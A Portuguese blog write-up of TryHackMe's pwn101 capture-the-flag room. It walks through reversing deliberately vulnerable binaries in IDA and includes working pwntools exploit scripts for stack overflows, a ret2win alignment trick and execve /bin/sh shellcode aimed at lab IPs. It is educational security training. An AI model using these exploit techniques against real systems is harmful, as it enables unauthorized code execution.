<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Uma introdução prática a Exploração de Binários com Engenharia Reversa: writeUp da sala pwn101 THM | Blog do GRIS</title>
<meta name=keywords content="pwning,reverse engineering"><meta name=description content="Nesse relatório tento usar a sala [pwn101](https://tryhackme.com/r/room/pwn101) para estimular o aprendizado de Engenharia Reversa e Exploração de Binários a partir de programas vulneráveis."><meta name=author content="0xCr0w"><link rel=canonical href=http://localhost:1313/blog/2024-08-11-pwn101-thm-writeup/><meta name=google-site-verification content="G-YWN8S4BKK0"><link crossorigin=anonymous href=/assets/css/stylesheet.45e028aa8ce0961349adf411b013ee39406be2c0bc80d4ea3fc04555f7f4611a.css integrity="sha256-ReAoqozglhNJrfQRsBPuOUBr4sC8gNTqP8BFVff0YRo=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/blog/2024-08-11-pwn101-thm-writeup/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css integrity=sha384-MlJdn/WNKDGXveldHDdyRP1R4CTHr3FeuDNfhsLPYrq2t0UBkUdK2jyTnXPEK1NQ crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js integrity=sha384-VQ8d8WVFw0yHhCk5E8I86oOhv48xLpnDZx5T9GogA/Y84DcCKWXDmSDfn13bzFZY crossorigin=anonymous></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous onload=renderMathInElement(document.body)></script>>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><meta property="og:url" content="http://localhost:1313/blog/2024-08-11-pwn101-thm-writeup/"><meta property="og:site_name" content="Blog do GRIS"><meta property="og:title" content="Uma introdução prática a Exploração de Binários com Engenharia Reversa: writeUp da sala pwn101 THM"><meta property="og:description" content="Nesse relatório tento usar a sala [pwn101](https://tryhackme.com/r/room/pwn101) para estimular o aprendizado de Engenharia Reversa e Exploração de Binários a partir de programas vulneráveis."><meta property="og:locale" content="pt"><meta property="og:type" content="article"><meta property="article:section" content="blog"><meta property="article:published_time" content="2024-08-11T00:00:00+00:00"><meta property="article:modified_time" content="2024-08-11T00:00:00+00:00"><meta property="article:tag" content="Pwning"><meta property="article:tag" content="Reverse Engineering"><meta property="og:image" content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Uma introdução prática a Exploração de Binários com Engenharia Reversa: writeUp da sala pwn101 THM"><meta name=twitter:description content="Nesse relatório tento usar a sala [pwn101](https://tryhackme.com/r/room/pwn101) para estimular o aprendizado de Engenharia Reversa e Exploração de Binários a partir de programas vulneráveis."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Blogs","item":"http://localhost:1313/blog/"},{"@type":"ListItem","position":2,"name":"Uma introdução prática a Exploração de Binários com Engenharia Reversa: writeUp da sala pwn101 THM","item":"http://localhost:1313/blog/2024-08-11-pwn101-thm-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Uma introdução prática a Exploração de Binários com Engenharia Reversa: writeUp da sala pwn101 THM","name":"Uma introdução prática a Exploração de Binários com Engenharia Reversa: writeUp da sala pwn101 THM","description":"Nesse relatório tento usar a sala [pwn101](https://tryhackme.com/r/room/pwn101) para estimular o aprendizado de Engenharia Reversa e Exploração de Binários a partir de programas vulneráveis.","keywords":["pwning","reverse engineering"],"articleBody":"[pwn101 5/10] writeUp [pwn101 - Challenge 1] A sala nos diz que a aplicação está rodando no endereço ‘10.10.151.216:9001’. Com o utilitário nc podemos escrever e ler em conexões TCP e UDP. Assim, podemos nos conectar com a aplicação usando o comando:\nnc 10.10.151.216 9001\nAo conectarmos com a aplicação recebemos um texto com um pedido de ajuda para fornecer os ingredientes para o programa como input. A sala fornece uma dica de inicio ‘AAAAAAAAAAA’. É de se imaginar que o programa possua algum tipo de buffer overflow. É fácil de receber um shell quando tentamos quebrar a aplicação fornecendo uma string com um tamanho grande.\nPorém, vamos tentar entender direito o que está acontecendo. Talvez não tenhamos tanta sorte da próxima vez.\nNo início da função principal temos uma instrução que move o valor 0x539 para o endereço var_4. Mais embaixo, temos a chamada para a função _gets sem nenhuma restrição de tamanho de input. Esse input é armazenado em var_40. Com isso, é possível sobrescrever a variável var_4. No fim, existe uma comparação entre o valor de inicio em var_4 com o valor atual e um salto associado à condição not zero é realizada na instrução abaixo. Ou seja, o salto é realizado se o resultado da comparação anterior não for igual. Portanto, basta modificar o valor da variável na pilha que obtemos o shell. Para isso, foi necessário abusar da função _gets e explorar o stack overflow para garantir que a instrução jnz nos coloque no procedimento que nos dá o shell.\n[pwn102 - Challenge 2] No segundo desafio, nos deparamos com um programa que printa na tela I need badf00d to fee1dead Am I right? e que pede input ao usuário. De cara, tentamos quebrar o programa. Porém, nada de muito interessante acontece.\nPartimos, então, para engenharia reversa do binário. Na imagem abaixo, podemos ver as variáveis locais e as instruções que são do nosso interesse. A função possui três variáveis locais. As variáveis 4 e 8 estão localizadas em rbp - 4 e -8, respectivamente. Outra variável é declarada. Essa está localizada na posição rbp - 0x70. Existe uma chamada para a scanf que carrega o input do usuário na variável 70. Logo depois, é possível ver na imagem que os valores 0C0FF33h e 0C0D3h são comparados aos valores nas variaveis 4 e 8. Ou seja, o programa checka se os valores nessas variaveis são esses. A cada instrução de comparação, existe uma instrução de salto condicional que pula para um procedimento de saída se não for igual a zero. A seguir, temos uma chamada de sistema com um comando de shell a ser executado. Nosso objetivo então é chegar nessa chamada de sistema. Porém, só conseguiremos se os valores de var4 e var8 forem 0C0FF33h e 0C0D3h, respectivamente. Como não existe nenhuma restrição de tamanho na chamada da scanf, podemos usar essa entrada de dados para sobrescrever var4 e var8. Sabemos a posição de cada uma relativa ao endereço de var70. A variável 8 está à (0x70 - 0x8) de distância da variável 70. E a variável 4 está logo abaixo da 8. Portanto, devemos ter:\nPreenchimento completo da variável 70 na pilha: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nA * (0x70 - 0x8)\nPreenchimento das variáveis 8 e 4 na pilha com os valores desejados: \\xd3\\xc0\\x00\\x00\\x33\\xff\\xc0\\x00 (Little Endian)\nAqui precisamos começar a utilizar uma ferramenta chamada pwntools - depois de tentar redirecionar a saída do echo e falhar repetidas vezes. Trata-se de uma ferreamenta que nos fornece uma interface para interagir de forma fácil tanto com processos do seu host quanto aplicações em servidores na internet. A partir do script abaixo, é possível ver algumas das funcionalidades que começaremos a usar. As linhas do código possuem comentários para esclarecer seu papel.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import pwn #fornecendo um parâmetro que nos permite verificar o dado bruto que está sendo enviado e recebido pwn.context.log_level = 'debug' #estabelecendo o enderenço de domunicação remoto. Substitua ip pelo ip do servidor p = pwn.remote(\"ip\", 9002) #bytes enviados que farao a exploração payload = b'A' * (0x70-0x8) + pwn.p32(0xc0d3) + pwn.p32(0xc0ff33) #metodo que recebe dados puros p.recv() #metodo que envia o dado especificado pelo parametro p.sendline(payload) p.recv() #nos da uma interface para emular um terminal p.interactive() [pwn103 - Challenge 3] Ao iniciarmos o programa, nos deparamos com uma interface com uma lista de escolhas. Vasculhando as funcionalidades na tentativa de quebrar o programa, encontramos um input em “General” que pode ser explorado. Tentar quebrar o programa nos retorna Segmentation Fault (uma tentativa de acessar um endereço virtual inválido). Começaremos a investigar a partir daqui.\nVamos abrir o nosso querido IDA e partir para a análise do binário. Vale notar na parte esquerda da interface do IDA: podemos ver as funções que o programa faz uso. Podemos reconhecer “General”, “bot_cmd”, “announcements”, “discussion” e “rules”. Além disso, temos uma função chamada “admins_only” que parece um tanto quanto suspeita.\nVamos partir então para a função principal do programa e tentar entender a sua lógica. Nada muito interessante aqui. Temos basicamente uma jump table que associa cada input 1-5 a um endereço. Vamos então verificar a função “General” que, ao que tudo indica, nos forneceu um segmentation fault. Temos no início a declaração de uma variável com tamanho de 20 bytes. Reconhecemos a função scanf. Antes de sua chamada, é possível perceber que carregamos o endereço da variável s1 em rsi. Logo abaixo, existe a comparação do nosso input com a string “yes” com um salto para loc_401366 caso não sejam iguais. Nesse caso, pensei em análisar de forma dinâmica o que acontece quando eu “quebro” o programa. Vamos ver o que acontece durante o Segmentation Fault.\nQuando quebramos o programa, recebemos o seguinte aviso do IDA:\nEle reclama que no endereço 0x401377 tentamos acessar um endereço inválido. Mas, qual endereço? Vamos colocar um breakpoint no endereço da reclamação e visualizar a stack do processo.\nClaro. Aparentemente, estamos retornando para uma sequência de 41 que é a codificação ascii de ‘A’ em hexadecimal. Hipotése:\n1 Se pudermos controlar esse endereço, podemos controlar o fluxo do programa. Vamos tentar realizar uma prova de conceito manipulando diretamente a memória do processo a fim de manipular o endereço de retorno e ver o que acontece.\nTentaremos colocar o endereço de admins_only\nConseguimos. Ou seja, basta colocarmos o endereço entre os A’s enviados para redirecionar o programa para admins_only. Vamos ver como o programa se comporta adiante. Para isso, usarei a técnica de breakpoints em todas as instruções e olhos atentos.\nTalvez estejamos sobreescrevendo algo importante.\nVemos que para chegar no endereço de retorno temos que preencher 40 A’s. Façamos somente isso com a modificação do endereço e vamos ver o que acontece.\nO programa continua normalmente até que tenhamos outra segmentation fault na chamada de _system, nos redirecionando para uma instrução movaps dentro da função do_system.\nProcurando a definição da instrução na internet, vemos que precisamos garantir o alinhamento de 16 bytes dos operandos já que temos uma operação de memória.\nOlhando para o valor do rsp, percebemos que não é o caso.\nPara contornar a situação, vamos manipular o tamanho da stack a fim de que tenhamos o alinhamento desejado. Uma técnica comum é a de usar um retorno intermediário. A ideia é saltar para uma instrução de retorno que saltará para a nossa função desejada. Nesse caso, vamos saltar de forma intermediária para o endereço 0x40158B. Depois que saltarmos, retn irá pegar o valor no topo da stack e saltar para esse endereço. Portanto, aí que colocaremos o nosso endereço da função admins_only. Nosso shellcode deve ter a seguinte cara:\n1 payload = b'A' * 40 + pwn.p64(0x40158B) + pwn.p64(0x401554) Nosso script ficará assim:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import pwn import time pwn.context.log_level = 'debug' payload = b'A' * 40 + pwn.p64(0x40158B) + pwn.p64(0x401554) p = pwn.remote(\"ip\", 9003) p.recv() time.sleep(1) p.sendline(b'3') time.sleep(1) p.recv() p.sendline(payload) p.interactive() [pwn104 - Challenge 4] No quarto desafio, nosso programa nos printa na tela uma mensagem com um endereço e aguarda um input. Como já é hábito, tentamos quebrar o programa. A nossa entrada gera um Segmentation Fault. Vamos partir para a análise dinâmica com o IDA.\nA estrutura do nosso programa é simples. Temos uma função principal com uma variável buf de tamanho 0x50. As coisas ficam interessantes nas chamadas para printf e read.\nA primeira carrega o endereço de buf e carrega a seguinte string para printar:\n1 \"I'm waiting for you at %p\\n\" Vamos comparar o endereço carregado em rsi na instrução mov rsi, rax com o que aparece no terminal.\nDe fato, o endereço que aparece no terminal é o endereço do próprio buffer que está na função main. Posteriormente, a função read é chamada com o endereço de escrita no endereço de buf e com o tamanho de 200 bytes. É de esperar o Segmentation Fault. Estamos escrevendo até 200 bytes no endereço de buf. Mas, como exploramos essa vulnerabilidade? Dessa vez não existe nenhuma função de retorno interessante no binário. Lembre-se que não existe diferença fundamental entre dados e instruções. Bytes passam a cumprir papel de dados ou instruções a depender do contexto. A linguagem assembly nada mais é que uma codificação que permite que humanos interpretem mais facilmente a linguagem de máquina. Ainda, a linguagem de máquina nada mais é que uma codificação de bytes que permite que máquinas sejam capazes de interpretar bytes. Todo processador precisa “saber” aonde buscar os bytes a serem interpretados como instruções. Essa responsabilidade na arquitetura dos processadores x86-64 fica para o RIP, que é um registrador que armazena o endereço da próxima instrução. Se conseguirmos controlar o RIP, conseguimos escolher o que o processador vai tentar ler para interpretar como instruções. Mas, primeiro, vamos usar uma ferramenta que nos mostra as medidas de segurança que existem no binário.\nA ferramenta nos diz que a execução em pilha é permitida. Isso significa que podemos carregar bytes que correspondem a instruções na pilha e mandar o RIP apontar para lá. A forma que nós estamos acostumados a fazer é de garantir que o topo da pilha contenha nosso endereço desejado no momento em que o RIP aponta para a instrução retn.\nO procedimento então fica da seguinte forma:\n1 preencher o buf com instruções + padding + endereço de retn Colocando alguns A’s e verificando o valor do rsp quando a instrução retn é executada, descobrimos até onde precisamos preencher. O fluxo retorna para libc_start_call_main.\nSe contarmos quantas células temos, veremos que temos 12 * 8 bytes para serem preenchidos. Começamos em 0x00007FFFFFFFDC80 e terminamos em 0x00007FFFFFFFDCD8. Nosso payload deve ser da forma:\n1 payload = shellcode + b'A' * (88-len(shellcode)) + endereço O que queremos executar exatamente? Bom. Podemos executar instruções arbitrárias - contanto que caibam no buf. Porque não poppar um shell? Procurando na internet encontramos um shellcode x64 linux que realiza um execve com “bin/sh”. E como resolvemos o endereço? Bom. Nós recebemos o endereço na tela, basta capturamos com o pwntools.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import pwn import time #pwn.context.binary = binary = './pwn104-1644300377109.pwn104' pwn.context.log_level = 'debug' shellcode = b'\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05' payload = shellcode + b'A' * (88-len(shellcode)) #p = pwn.process(binary) p = pwn.remote(\"10.10.225.226\", 9004) p.recvuntil(b\"I'm waiting for you at \") address = p.recvline() time.sleep(1) bufferAddress = pwn.p64(int(address, 16)) payload = payload + bufferAddress p.sendline(payload) p.interactive() É importante notar a linha de conversão do endereço já que não recebemos os bytes puros no terminal. Recebemos a representação em ascii, como é possível ver a partir do offset 0x84 no pacote abaixo.\n[pwn105 - Challenge 5] Ao executarmos o programa, nos deparamos com uma interface para a inserção de dois números. Temos um input para cada número. O programa printa na tela o resultado da soma dos dois. Tentando quebrar o programa de alguma forma não encontramos nada de interessante. Partimos logo, então, para a análise do binário no IDA.\nO breakpoints marcam instruções do nosso interesse. Temos no início, dois scanf sem controle de tamanho de input. Percebemos também que os valores do primeiro e segundo input são carregados nas variáveis var14 e var10, respectivamente.\nEsses valores são carregados nos registrados eax e edx. Em seguida, temos duas instruções do tipo\n1 2 add eax, edx mov [rbp+var_C], eax que adiciona os valores carregados no registrador eax e armazena na variável C.\nNosso objetivo está nos offset 0x130E e 0x1312.\n1 2 cmp [rbp+var_C], 0 js short loc_134B A primeira instrução verifica se o valor em var_C é negativo. A segunda pula para o endereço do procedimento do shell caso var_C seja negativa. O que precisamos então, é garantir que a variável C seja negativa. Se tentarmos simplesmente colocar valores negativos nos input teremos problemas com as seguintes instruções:\n1 2 3 4 5 6 mov eax, [rbp+var_14] test eax, eax js short loc_1384 mov eax, [rbp+var_10] test eax, eax js short loc_1384 Essas instruções verificam se uma das variáveis inseridas são negativas. Se forem, o programa salta para o procedimento loc_1384, que finaliza o programa.\nMas então, como fazer isso? Sabemos que nossas variáveis tem tamanho de 4 bytes.\nAlém disso, lembre-se que nossos inteiros tem o valor máximo de 2147483647 e da forma de representação dos números com sinal em assembly. Pensando com a codificação two’s complement, podemos abusar do overflow de inteiros (já que nesse caso não temos nenhuma checkagem). Com isso:\n","wordCount":"2271","inLanguage":"en","image":"http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-08-11T00:00:00Z","dateModified":"2024-08-11T00:00:00Z","author":{"@type":"Person","name":"0xCr0w"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/blog/2024-08-11-pwn101-thm-writeup/"},"publisher":{"@type":"Organization","name":"Blog do GRIS","logo":{"@type":"ImageObject","url":"http://localhost:1313/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Home (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/ title=Categorias><span>Categorias</span></a></li><li><a href=http://localhost:1313/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://www.youtube.com/@grisufrj title=Youtube><span>Youtube</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/blog/>Blogs</a></div><h1 class="post-title entry-hint-parent">Uma introdução prática a Exploração de Binários com Engenharia Reversa: writeUp da sala pwn101 THM</h1><div class=post-description>Nesse relatório tento usar a sala [pwn101](https://tryhackme.com/r/room/pwn101) para estimular o aprendizado de Engenharia Reversa e Exploração de Binários a partir de programas vulneráveis.</div><div class=post-meta><span title='2024-08-11 00:00:00 +0000 UTC'>August 11, 2024</span>&nbsp;·&nbsp;11 min&nbsp;·&nbsp;2271 words&nbsp;·&nbsp;0xCr0w&nbsp;|&nbsp;<a href=https://github.com/%3cpath_to_repo%3e/content/blog/2024-08-11-pwn101-THM-writeUp.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=post-content><h1 id=pwn101-510-writeup>[pwn101 5/10] writeUp<a hidden class=anchor aria-hidden=true href=#pwn101-510-writeup>#</a></h1><h2 id=pwn101---challenge-1>[pwn101 - Challenge 1]<a hidden class=anchor aria-hidden=true href=#pwn101---challenge-1>#</a></h2><p>A sala nos diz que a aplicação está rodando no endereço &lsquo;10.10.151.216:9001&rsquo;. Com o utilitário nc podemos escrever e ler em conexões TCP e UDP. Assim, podemos nos conectar com a aplicação usando o comando:</p><p>nc 10.10.151.216 9001</p><p>Ao conectarmos com a aplicação recebemos um texto com um pedido de ajuda para fornecer os ingredientes para o programa como input. A sala fornece uma dica de inicio &lsquo;AAAAAAAAAAA&rsquo;. É de se imaginar que o programa possua algum tipo de buffer overflow. É fácil de receber um shell quando tentamos quebrar a aplicação fornecendo uma string com um tamanho grande.</p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio1Imagem1.png></p><p>Porém, vamos tentar entender direito o que está acontecendo. Talvez não tenhamos tanta sorte da próxima vez.</p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio1Imagem2.png></p><p>No início da função principal temos uma instrução que move o valor <em>0x539</em> para o endereço <strong>var_4</strong>. Mais embaixo, temos a chamada para a função _gets sem nenhuma restrição de tamanho de input. Esse input é armazenado em <strong>var_40</strong>. Com isso, é possível sobrescrever a variável <strong>var_4</strong>. No fim, existe uma comparação entre o valor de inicio em <strong>var_4</strong> com o valor atual e um salto associado à condição <strong>not zero</strong> é realizada na instrução abaixo. Ou seja, o salto é realizado se o resultado da comparação anterior não for igual. Portanto, basta modificar o valor da variável na pilha que obtemos o shell. Para isso, foi necessário abusar da função _gets e explorar o stack overflow para garantir que a instrução jnz nos coloque no procedimento que nos dá o shell.</p><h2 id=pwn102---challenge-2>[pwn102 - Challenge 2]<a hidden class=anchor aria-hidden=true href=#pwn102---challenge-2>#</a></h2><p>No segundo desafio, nos deparamos com um programa que printa na tela <strong>I need badf00d to fee1dead
Am I right?</strong> e que pede input ao usuário. De cara, tentamos quebrar o programa. Porém, nada de muito interessante acontece.</p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio2Imagem1.png></p><p>Partimos, então, para engenharia reversa do binário. Na imagem abaixo, podemos ver as variáveis locais e as instruções que são do nosso interesse. A função possui três variáveis locais. As variáveis 4 e 8 estão localizadas em rbp - 4 e -8, respectivamente. Outra variável é declarada. Essa está localizada na posição rbp - 0x70. Existe uma chamada para a scanf que carrega o input do usuário na variável 70. Logo depois, é possível ver na imagem que os valores 0C0FF33h e 0C0D3h são comparados aos valores nas variaveis 4 e 8. Ou seja, o programa checka se os valores nessas variaveis são esses. A cada instrução de comparação, existe uma instrução de salto condicional que pula para um procedimento de saída se não for igual a zero. A seguir, temos uma chamada de sistema com um comando de shell a ser executado. Nosso objetivo então é chegar nessa chamada de sistema. Porém, só conseguiremos se os valores de var4 e var8 forem 0C0FF33h e 0C0D3h, respectivamente. Como não existe nenhuma restrição de tamanho na chamada da scanf, podemos usar essa entrada de dados para sobrescrever var4 e var8. Sabemos a posição de cada uma relativa ao endereço de var70. A variável 8 está à (0x70 - 0x8) de distância da variável 70. E a variável 4 está logo abaixo da 8. Portanto, devemos ter:</p><ul><li><strong>Preenchimento completo da variável 70 na pilha:</strong></li></ul><p>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</p><p>A * (<em>0x70 - 0x8)</em></p><ul><li><strong>Preenchimento das variáveis 8 e 4 na pilha com os valores desejados:</strong></li></ul><p>\xd3\xc0\x00\x00\x33\xff\xc0\x00 (Little Endian)</p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio2Imagem2.png></p><p>Aqui precisamos começar a utilizar uma ferramenta chamada pwntools - <em>depois de tentar redirecionar a saída do echo e falhar repetidas vezes.</em> Trata-se de uma ferreamenta que nos fornece uma interface para interagir de forma fácil tanto com processos do seu host quanto aplicações em servidores na internet. A partir do script abaixo, é possível ver algumas das funcionalidades que começaremos a usar. As linhas do código possuem comentários para esclarecer seu papel.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pwn</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#fornecendo um parâmetro que nos permite verificar o dado bruto que está sendo enviado e recebido</span>
</span></span><span class=line><span class=cl><span class=n>pwn</span><span class=o>.</span><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#estabelecendo o enderenço de domunicação remoto. Substitua ip pelo ip do servidor</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>pwn</span><span class=o>.</span><span class=n>remote</span><span class=p>(</span><span class=s2>&#34;ip&#34;</span><span class=p>,</span> <span class=mi>9002</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#bytes enviados que farao a exploração</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mh>0x70</span><span class=o>-</span><span class=mh>0x8</span><span class=p>)</span> <span class=o>+</span> <span class=n>pwn</span><span class=o>.</span><span class=n>p32</span><span class=p>(</span><span class=mh>0xc0d3</span><span class=p>)</span> <span class=o>+</span> <span class=n>pwn</span><span class=o>.</span><span class=n>p32</span><span class=p>(</span><span class=mh>0xc0ff33</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#metodo que recebe dados puros</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#metodo que envia o dado especificado pelo parametro</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1>#nos da uma interface para emular um terminal</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=pwn103---challenge-3>[pwn103 - Challenge 3]<a hidden class=anchor aria-hidden=true href=#pwn103---challenge-3>#</a></h2><p>Ao iniciarmos o programa, nos deparamos com uma interface com uma lista de escolhas. Vasculhando as funcionalidades na tentativa de quebrar o programa, encontramos um input em &ldquo;General&rdquo; que pode ser explorado. Tentar quebrar o programa nos retorna Segmentation Fault (uma tentativa de acessar um endereço virtual inválido). Começaremos a investigar a partir daqui.</p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio3Imagem1.png></p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio3Imagem2.png></p><p>Vamos abrir o nosso querido IDA e partir para a análise do binário. Vale notar na parte esquerda da interface do IDA: podemos ver as funções que o programa faz uso. Podemos reconhecer &ldquo;General&rdquo;, &ldquo;bot_cmd&rdquo;, &ldquo;announcements&rdquo;, &ldquo;discussion&rdquo; e &ldquo;rules&rdquo;. Além disso, temos uma função chamada &ldquo;admins_only&rdquo; que parece um tanto quanto suspeita.</p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio3Imagem3.png></p><p>Vamos partir então para a função principal do programa e tentar entender a sua lógica. Nada muito interessante aqui. Temos basicamente uma jump table que associa cada input 1-5 a um endereço. Vamos então verificar a função &ldquo;General&rdquo; que, ao que tudo indica, nos forneceu um segmentation fault.
